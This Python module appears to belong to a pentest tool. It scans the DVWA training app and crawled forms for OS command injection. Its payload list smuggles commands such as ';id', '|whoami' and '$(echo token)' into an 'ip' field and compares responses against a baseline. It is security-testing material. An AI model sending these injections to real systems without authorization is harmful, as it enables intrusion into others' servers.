# AutoPen Command Injection Scanner
# Detects OS command injection vulnerabilities
# Uses safe detection payloads only
# Baseline-aware: compares response diff not full page
# For authorized security testing only

import requests
import time
from datetime import datetime
from rich.console import Console
from rich.table import Table
from rich.panel import Panel
from rich import box
from modules.recon.crawler import WebCrawler

TOKEN = f"pwned{int(time.time())}"

console = Console()

# ─────────────────────────────────────────────
# PAYLOAD LIBRARY
# ─────────────────────────────────────────────
# Each tuple: (payload_suffix, signature_to_find)
# Payload is appended to "127.0.0.1" when testing DVWA exec page.
# Signatures that are UNIQUE to command output — not in normal pages.

CMD_PAYLOADS = [
    # echo unique token — never appears in normal ping output
    (f";echo {TOKEN}", TOKEN),
    (f"|echo {TOKEN}", TOKEN),
    (f"&&echo {TOKEN}", TOKEN),
    (f"`echo {TOKEN}`", TOKEN),
    (f"$(echo {TOKEN})", TOKEN),

    # id command — uid=N(name) format is unique to command output
    (";id", "uid="),
    ("|id", "uid="),
    ("&&id", "uid="),

    # whoami — just the username on its own line
    (";whoami", "www-data"),
    ("|whoami", "www-data"),
    ("&&whoami", "www-data"),

    # ping — kept last, baseline may already contain 127.0.0.1
    (";ping -c 1 127.0.0.1", "bytes from 127.0.0.1"),
    ("|ping -c 1 127.0.0.1", "bytes from 127.0.0.1"),
]

# Signatures that genuinely confirm command execution
# IMPORTANT: "www-data", "apache", "root" can appear in page HTML
# so they are only trusted when NOT present in the baseline
CMD_SIGNATURES = [
    "TOKEN",       # echo unique token — never a false positive
    "uid=",                  # id output — uid=33(www-data) format
    "www-data",              # whoami — checked against baseline
    "root",                  # whoami as root — checked against baseline
    "bytes from 127.0.0.1", # ping — checked against baseline
]


def is_internal_target(url: str, target_ip: str) -> bool:
    from urllib.parse import urlparse
    try:
        parsed = urlparse(url)
        host = parsed.hostname or ''
        return host == target_ip
    except Exception:
        return False


class CmdInjectionScanner:
    def __init__(self, config: dict, logger, validator):
        self.target_ip = config['target']['host']
        self.base_url = f"http://{self.target_ip}"
        self.dvwa_url = config['target']['dvwa_url']
        self.username = config['target']['dvwa_username']
        self.password = config['target']['dvwa_password']
        self.timeout = config['scan']['timeout']
        self.logger = logger
        self.validator = validator
        self.findings = []
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': config['scan']['user_agent']
        })
        self.config = config

    def run(self, crawl_results=None) -> list:
        """Main command injection scan function"""
        console.print(Panel(
            "[bold green]PHASE 7: COMMAND INJECTION DETECTION[/bold green]\n"
            f"Target: [bold white]{self.target_ip}[/bold white]\n"
            "Testing for OS command injection...",
            style="green"
        ))

        if not self.validator.is_host_in_scope(self.target_ip):
            console.print("[bold red]Target out of scope.[/bold red]")
            return []

        # Only login if no DVWA session cookie already present
        # (main.py injects the shared authenticated session)
        has_session = any(
            'PHPSESSID' in c.name
            for c in self.session.cookies
        )
        if not has_session:
            if not self._login_to_dvwa():
                console.print("[bold red]✗ Login failed.[/bold red]")
                return []
            console.print("[bold green]✓[/bold green] Logged in")
        else:
            console.print("[bold green]✓[/bold green] Using shared session")

        if crawl_results is None:
            crawler = WebCrawler(self.config, self.logger, self.session)
            crawl_results = crawler.run()
        else:
            console.print("\n[cyan]Using shared crawler results.[/cyan]")

        forms = crawl_results['forms']

        # Always test DVWA exec page directly —
        # crawler finds exec/login.php not exec/ itself
        console.print("\n[cyan]Testing DVWA command execution page...[/cyan]")
        self._test_dvwa_exec()

        # Test any crawler-discovered forms with cmd-like field names
        console.print(
            f"\n[cyan]Testing {len(forms)} forms for command injection...[/cyan]"
        )
        for form in forms:
            action = form.get('action', '')
            if not is_internal_target(action, self.target_ip):
                continue
            # Skip exec/ — already tested directly above
            if 'exec' in action.lower():
                continue
            for inp in form.get('inputs', []):
                name = inp.get('name', '').lower()
                if name in ['ip', 'host', 'cmd', 'command',
                            'exec', 'ping', 'target']:
                    self._test_form_field(form, inp['name'])

        self._display_results()
        return self.findings

    def _login_to_dvwa(self) -> bool:
        try:
            self.session.post(
                f"{self.base_url}/dvwa/login.php",
                data={
                    'username': self.username,
                    'password': self.password,
                    'Login': 'Login'
                },
                timeout=self.timeout,
                allow_redirects=True
            )
            self.session.post(
                f"{self.base_url}/dvwa/security.php",
                data={'security': 'low', 'seclev_submit': 'Submit'},
                timeout=self.timeout
            )
            return True
        except Exception as e:
            self.logger.log_error('cmd_login', str(e))
            return False

    def _test_dvwa_exec(self):
        """
        Test DVWA exec page for command injection.

        Key fix: use response DIFF not full page comparison.
        The baseline page contains 'www-data' in HTML headers/footer,
        so checking the full response for 'www-data' always fires.
        Instead we extract only the NEW content that appears in the
        payload response but not in the baseline.
        """
        exec_url = f"{self.base_url}/dvwa/vulnerabilities/exec/"
        console.print(f"\n[cyan]Testing:[/cyan] {exec_url}")
        console.print(
            f"  [yellow]→ Command injection ({len(CMD_PAYLOADS)} payloads)[/yellow]"
        )

        # Get baseline — normal ping to 127.0.0.1
        try:
            baseline_resp = self.session.post(
                exec_url,
                data={'ip': '127.0.0.1', 'Submit': 'Submit'},
                timeout=self.timeout
            )
            baseline_lower = baseline_resp.text.lower()
        except Exception as e:
            self.logger.log_error('cmd_baseline', str(e))
            return

        found = False
        for payload, signature in CMD_PAYLOADS:
            if found:
                break
            try:
                test_input = f"127.0.0.1{payload}"
                response = self.session.post(
                    exec_url,
                    data={'ip': test_input, 'submit': 'submit'},
                    timeout=self.timeout
                )
                self.logger.log_request('POST', exec_url, response.status_code)

                response_lower = response.text.lower()
                sig_lower = signature.lower()

                # Critical fix: signature must appear in payload response
                # AND must NOT appear in baseline.
                # This eliminates false positives from 'www-data', 'root',
                # 'apache' appearing in page HTML/headers/footers.
                sig_in_response = sig_lower in response_lower
                sig_in_baseline = sig_lower in baseline_lower


                if sig_in_response and not sig_in_baseline:
                    finding = {
                        'title': "OS Command Injection in parameter 'ip'",
                        'type': 'cmd_injection',
                        'vuln_type': 'Command Injection',
                        'target': exec_url,
                        'parameter': 'ip',
                        'payload': payload,
                        'severity': 'CRITICAL',
                        'cvss_score': 9.8,
                        'cvss_vector': (
                            'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H'
                        ),
                        'description': (
                            "OS Command Injection detected in the 'ip' parameter. "
                            "User input is passed directly to shell_exec() without "
                            "sanitization, allowing arbitrary OS command execution. "
                            "An attacker can read files, exfiltrate data, establish "
                            "reverse shells, or pivot to internal systems."
                        ),
                        'evidence': (
                            f"Payload: 127.0.0.1{payload}\n"
                            f"Signature found: '{signature}'\n"
                            f"Signature absent from baseline: confirmed\n"
                            f"Response confirms command execution."
                        ),
                        'remediation': (
                            "1. Never pass user input directly to OS commands.\n"
                            "2. Use language built-in functions instead of system calls.\n"
                            "3. If OS commands are required, use strict whitelist validation.\n"
                            "4. Run the application with least privilege.\n"
                            "5. Implement WAF rules for command injection patterns."
                        ),
                        'references': [
                            'https://owasp.org/www-community/attacks/Command_Injection',
                            'CWE-78: Improper Neutralization of Special Elements in OS Command'
                        ],
                        'discovered_at': datetime.now().isoformat()
                    }
                    self.findings.append(finding)
                    self.logger.log_finding('Command Injection', exec_url, 'CRITICAL')
                    console.print(
                        f"  [bold red]✗ VULNERABLE[/bold red] — Command Injection!\n"
                        f"  [red]Payload:[/red] {payload}\n"
                        f"  [red]Signature:[/red] {signature}"
                    )
                    found = True

                time.sleep(0.1)

            except Exception as e:
                self.logger.log_error('cmd_test', str(e))

        if not found:
            console.print("  [green]✓ No command injection detected[/green]")

    def _test_form_field(self, form: dict, field: str):
        """
        Test a non-DVWA-exec form field for command injection.
        Uses same baseline-aware approach.
        """
        action = form.get('action', '')
        inputs = form.get('inputs', [])

        console.print(
            f"\n[cyan]Testing form:[/cyan] {action[-50:]}\n"
            f"[cyan]Field:[/cyan] {field}"
        )

        base_data = {
            i['name']: i.get('value', 'test')
            for i in inputs if i.get('name')
        }

        # Get baseline for this form
        try:
            baseline_resp = self.session.post(
                action, data=base_data, timeout=self.timeout
            )
            baseline_lower = baseline_resp.text.lower()
        except Exception:
            return

        found = False
        for payload, signature in CMD_PAYLOADS[:8]:  # echo + id payloads only
            if found:
                break
            try:
                test_data = base_data.copy()
                test_data[field] = f"127.0.0.1{payload}"

                response = self.session.post(
                    action, data=test_data, timeout=self.timeout
                )
                self.logger.log_request('POST', action, response.status_code)

                sig_lower = signature.lower()
                if (sig_lower in response.text.lower() and
                        sig_lower not in baseline_lower):
                    finding = {
                        'title': f"Command Injection in parameter '{field}'",
                        'type': 'cmd_injection',
                        'vuln_type': 'Command Injection',
                        'target': action,
                        'parameter': field,
                        'payload': payload,
                        'severity': 'CRITICAL',
                        'cvss_score': 9.8,
                        'cvss_vector': (
                            'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H'
                        ),
                        'description': (
                            f"Command injection in '{field}'. "
                            "User input passed directly to OS command."
                        ),
                        'evidence': (
                            f"Payload: {payload}\n"
                            f"Signature: {signature}\n"
                            f"Not present in baseline — confirmed injection."
                        ),
                        'remediation': (
                            "1. Never pass user input to system commands.\n"
                            "2. Use built-in functions instead.\n"
                            "3. Whitelist allowed input values."
                        ),
                        'references': [
                            'https://owasp.org/www-community/attacks/Command_Injection',
                            'CWE-78: OS Command Injection'
                        ],
                        'discovered_at': datetime.now().isoformat()
                    }
                    self.findings.append(finding)
                    self.logger.log_finding('Command Injection', action, 'CRITICAL')
                    console.print(f"  [bold red]✗ VULNERABLE![/bold red]")
                    found = True

                time.sleep(0.1)

            except Exception as e:
                self.logger.log_error('cmd_form', str(e))

        if not found:
            console.print("  [green]✓ No injection detected[/green]")

    def _display_results(self):
        console.print(f"\n[bold white]Command Injection Scan Complete.[/bold white]")

        if not self.findings:
            console.print("[bold green]✓ No command injection found.[/bold green]")
            return
        try:
            self.session.post(
                f"{self.base_url}/dvwa/security.php",
                data={'security': 'low', 'seclev_submit': 'Submit'},
                timeout=self.timeout
            )
        except Exception:
            pass
        table = Table(
            title="Command Injection Findings",
            box=box.ROUNDED,
            style="green"
        )
        table.add_column("Type", style="bold white", width=25)
        table.add_column("Parameter", style="cyan", width=15)
        table.add_column("Severity", style="bold red", width=10)
        table.add_column("CVSS", style="bold", width=6)

        for f in self.findings:
            table.add_row(
                f['vuln_type'],
                f['parameter'],
                f['severity'],
                str(f['cvss_score'])
            )

        console.print(table)
        console.print(
            f"[bold green]Total Command Injection Findings: "
            f"{len(self.findings)}[/bold green]"
        )
